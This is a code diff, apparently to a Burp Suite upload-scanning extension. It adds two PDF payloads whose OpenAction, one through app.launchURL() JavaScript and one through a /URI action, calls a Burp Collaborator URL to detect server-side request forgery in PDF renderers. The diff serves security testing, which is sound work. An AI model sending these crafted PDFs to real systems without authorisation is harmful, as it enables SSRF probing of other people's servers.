@@ -3499,6 +3499,38 @@ trailer <<
             colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                        redownload=True))
 
+            # Server-side SSRF via app.launchURL() JavaScript
+            # Triggers in wkhtmltopdf, PhantomJS, PDF.js (node), headless Chrome rendering PDFs server-side.
+            content = '%PDF-1.4\n1 0 obj\n<<>>\nendobj\n\ntrailer\n<<\n/Root\n  <</Pages <<>>\n  /OpenAction\n' \
+                      '    <<\n    /S /JavaScript\n    /JS (app.launchURL("' + BurpExtender.MARKER_COLLAB_URL + '");)\n' \
+                      '    >>\n  >>\n>>'
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PdfLaunchUrl"
+            title_colab = "PDF server-side SSRF via app.launchURL()"
+            detail_colab = ("A Burp Collaborator interaction was detected when uploading a PDF with an "
+                            "app.launchURL() JavaScript OpenAction pointing to the collaborator URL. "
+                            "This indicates the server renders or processes uploaded PDFs with a tool "
+                            "that evaluates embedded JavaScript (e.g. wkhtmltopdf, PhantomJS, headless "
+                            "Chrome, server-side PDF.js), resulting in server-side request forgery. "
+                            "Interactions:<br><br>")
+            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
+            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename, content, issue_colab))
+
+            # Server-side SSRF via /URI OpenAction
+            # Simpler mechanism: no JavaScript needed, triggers in PDF renderers that follow URI actions.
+            content = '%PDF-1.4\n1 0 obj\n<<>>\nendobj\n\ntrailer\n<<\n/Root\n  <</Pages <<>>\n  /OpenAction\n' \
+                      '    <<\n    /S /URI\n    /URI (' + BurpExtender.MARKER_COLLAB_URL + ')\n' \
+                      '    >>\n  >>\n>>'
+            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PdfUriAction"
+            title_colab = "PDF server-side SSRF via /URI OpenAction"
+            detail_colab = ("A Burp Collaborator interaction was detected when uploading a PDF with a "
+                            "/URI OpenAction pointing to the collaborator URL. "
+                            "This indicates the server renders or processes uploaded PDFs with a tool "
+                            "that follows URI actions (e.g. wkhtmltopdf, PhantomJS, headless Chrome, "
+                            "server-side PDF.js), resulting in server-side request forgery. "
+                            "Interactions:<br><br>")
+            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
+            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename, content, issue_colab))
+
         return colab_tests
 
     def _ssrf(self, injector, burp_colab):
